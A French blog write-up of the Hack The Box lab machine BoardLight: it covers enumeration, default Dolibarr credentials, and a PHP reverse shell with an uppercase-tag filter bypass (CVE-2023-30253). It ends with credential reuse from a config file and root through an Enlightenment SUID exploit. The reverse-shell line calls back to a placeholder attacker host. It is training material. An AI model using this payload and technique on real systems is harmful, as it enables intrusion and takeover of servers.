<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: BoardLight</title>
<meta name=description content="Platforme: Hack The Box Lien: BoardLight Niveau: Facile OS: Linux Lire cet article en anglais
BoardLight débute par la découverte d&amp;rsquo;un sous-domaine où se …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-boardlight/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: BoardLight"><meta property="og:description" content="Platforme: Hack The Box Lien: BoardLight Niveau: Facile OS: Linux Lire cet article en anglais
BoardLight débute par la découverte d&amp;rsquo;un sous-domaine où se …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-BoardLight/BoardLight.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-BoardLight/BoardLight.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: BoardLight"><meta name=twitter:description content="Platforme: Hack The Box Lien: BoardLight Niveau: Facile OS: Linux Lire cet article en anglais
BoardLight débute par la découverte d&amp;rsquo;un sous-domaine où se …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-boardlight/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-boardlight/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-BoardLight/BoardLight.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-boardlight/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-boardlight/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: BoardLight</h1><small role=doc-subtitle></small><p class=post-date>4 min read |
<span class=post-date>27 Septembre 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/BoardLight>BoardLight</a></li><li>Niveau: Facile</li><li>OS: Linux</li></ul><hr><p><a href=https://scorpiosec.com/posts/htb-boardlight/>Lire cet article en anglais</a></p><p>BoardLight débute par la découverte d&rsquo;un sous-domaine où se trouve une instance Dolibarr, à laquelle nous accédons en utilisant les informations d&rsquo;identification par défaut. Grâce à un reverse shell PHP couplé à une technique de manipulation des majuscules, nous obtenons notre accès initial. Nous découvrons ensuite un fichier de configuration contenant des identifiants qui nous permettent de prendre le contrôle d&rsquo;un autre compte. Enfin, nous obtenons les privilèges root en exploitant une vulnérabilité dans Enlightenment.</p><p>Address IP cible - <code>10.10.11.11</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>./nmap_scan.sh 10.10.11.11 BoardLight
</code></pre><p><strong>Resultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 22,80
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-09-21 23:01 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.11
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.053s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.41
</span></span><span style=display:flex><span>Service Info: Host: board.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 90.05 seconds
</span></span></code></pre></div><p>Notre scan révèle deux ports ouverts: SSH (22) et HTTP (80), nous ajoutons également <code>board.htb</code> au fichier <code>hosts</code> pour faciliter l&rsquo;énumération.</p><h2 id=enumération>Enumération</h2><p>À <code>http://board.htb/</code>, nous trouvons un site web pour une société de conseil en cybersécurité. Les boutons ne fonctionnent pas et il n&rsquo;y a rien de vraiment marquant.</p><p><img src=/images/HTB-BoardLight/boardlight_website.png alt="BoardLight website"></p><p>Nous essayons de trouver des répertoires cachés mais rien d&rsquo;intéressant n&rsquo;est trouvé.</p><pre tabindex=0><code>gobuster dir -u http://board.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><p><img src=/images/HTB-BoardLight/gobuster_cmd.png alt="Directory bruteforcing"></p><p>Avec l&rsquo;énumération des sous-domaines, nous trouvons un sous-domaine valide appelé <code>crm</code>.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://board.htb -H &#34;Host: FUZZ.board.htb&#34; -ic -fs 15949
</code></pre><p><img src=/images/HTB-BoardLight/ffuf_cmd.png alt="Subdomain enumeration"></p><p>Sur <code>http://crm.board.htb/</code> nous trouvons une page de connexion pour <a href=https://www.dolibarr.org/>Dolibarr</a>.</p><p><img src=/images/HTB-BoardLight/crm_board.png alt="Dolibarr ERP"></p><p>Une simple recherche Google nous permet de découvrir que les identifiants par défaut des instances Dolibarr sont <code>admin:admin</code> et en les utilisant nous accédons au tableau de bord.</p><p><img src=/images/HTB-BoardLight/Dolibarr_default_creds.png alt="Dolibarr default credentials"></p><p><img src=/images/HTB-BoardLight/dolibarr_dashboard.png alt="Dolibarr dashboard"></p><p>Bien que les systèmes CRM, CMS et ERP aient des objectifs différents, ils présentent souvent une vulnérabilité commune: une fois connecté, il est souvent possible d&rsquo;obtenir un shell en exécutant un code malveillant.</p><p>Dans la section <code>Websites</code>, nous créons un nouveau site web.</p><p><img src=/images/HTB-BoardLight/new_website.png alt="Dolibarr new website"></p><p>Ensuite, créons une page.</p><p><img src=/images/HTB-BoardLight/new_page.png alt="Dolibarr new page"></p><p>Après la création de la page, il y a un bouton <code>Edit HTML Source</code> que nous pouvons utiliser pour ajouter notre code.</p><p><img src=/images/HTB-BoardLight/edit_source.png alt="Edit HTML source button"></p><p>Nous essayons un reverse shell php basique.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#56b6c2>&lt;?</span><span style=color:#e06c75>php</span> <span style=color:#e06c75>system</span>(<span style=color:#98c379>&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/IP_ADDRESS/PORT_NUMBER 0&gt;&amp;1&#34;&#39;</span>) <span style=color:#7f848e>?&gt;</span>
</span></span></code></pre></div><p><img src=/images/HTB-BoardLight/rev_shell1.png alt="Dolibarr reverse shell"></p><p>Après avoir essayé de sauvegarder le code, nous obtenons une erreur, il semble que nous ne puissions pas utiliser <code>system</code>. A partir de là, nous pouvons soit trouver une autre méthode pour obtenir un shell, soit essayer de contourner la mesure de sécurité.</p><p><img src=/images/HTB-BoardLight/error_dolibarr.png alt="Dolibarr php system error"></p><h2 id=accès-initial>Accès Initial</h2><p>En recherchant les vulnérabilités de Dolibarr, nous trouvons <a href=https://www.vicarius.io/vsociety/posts/exploiting-rce-in-dolibarr-cve-2023-30253-30254>cette page</a> pour le <code>CVE-2023-30253</code> qui nous permet d&rsquo;obtenir une exécution de code à distance en utilisant une manipulation de majuscules.</p><p>Réessayons avec le php en majuscules (PHP).</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#56b6c2>&lt;?</span><span style=color:#e06c75>PHP</span> <span style=color:#e06c75>system</span>(<span style=color:#98c379>&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/IP_ADDRESS/PORT_NUMBER 0&gt;&amp;1&#34;&#39;</span>) <span style=color:#7f848e>?&gt;</span>
</span></span></code></pre></div><p><img src=/images/HTB-BoardLight/Dolibar_rce.png alt="Dolibarr RCE"></p><p>Après avoir sauvegardé le code modifié, nous obtenons un shell sous le nom de <code>www-data</code>.</p><p><img src=/images/HTB-BoardLight/foothold.png alt="foothold shell"></p><p>En consultant le fichier <code>passwd</code>, nous remarquons la présence d&rsquo;un utilisateur appelé <code>larissa</code> et, bien sûr, nous ne pouvons pas accéder à son répertoire personnel.</p><p><img src=/images/HTB-BoardLight/larissa_user.png alt="larissa user"></p><p>Grâce à linpeas, nous trouvons un répertoire de configuration à <code>/var/www/html/crm.board.htb/htdocs/conf/</code>.</p><p><img src=/images/HTB-BoardLight/linpeas_results.png alt="linpeas results"></p><p><img src=/images/HTB-BoardLight/conf_directory.png alt="conf directory"></p><p>En examinant le contenu de <code>conf.php</code>, nous obtenons des identifiants.</p><p><img src=/images/HTB-BoardLight/dolibarr_creds.png alt="dolibar conf credentials"></p><p>Avec le mot de passe trouvé, nous accédons au compte de larissa via SSH et nous trouvons le fichier <code>user.txt</code> dans son répertoire personnel.</p><p><img src=/images/HTB-BoardLight/user_flag.png alt="user flag"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Malheureusement, larissa n&rsquo;est pas autorisée à exécuter sudo.</p><p><img src=/images/HTB-BoardLight/sudo_cmd.png alt="sudo command"></p><p>Exécutons à nouveau linpeas pour trouver des pistes d&rsquo;escalade de privilèges. Nous trouvons un fichier appelé <code>enlightenment</code> appartenant à root avec le bit SUID activé et une référence au <a href=https://nvd.nist.gov/vuln/detail/CVE-2022-37706>CVE-2022-37706</a>.</p><p><img src=/images/HTB-BoardLight/suid-file.png alt="SUID on enlightenment binary"></p><p><a href=https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/tree/main>Ici</a> nous trouvons un PoC pour la vulnérabilité. Après avoir exécuté le script (exploit.sh) sur la cible, nous obtenons les privilèges root et <code>root.txt</code> est accessible dans <code>/root</code>.</p><p><img src=/images/HTB-BoardLight/root_flag.png alt="root flag"></p><p>Merci d&rsquo;avoir pris le temps de lire cet article!</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-headless/>&#8592;
Précédent:
HTB: Headless</a></p><p class=prev-post-date>juillet 19, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-freelancer/>Suivant:
HTB: Freelancer
&#8594;</a></p><p class=next-post-date>septembre 30, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès Initial</a></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>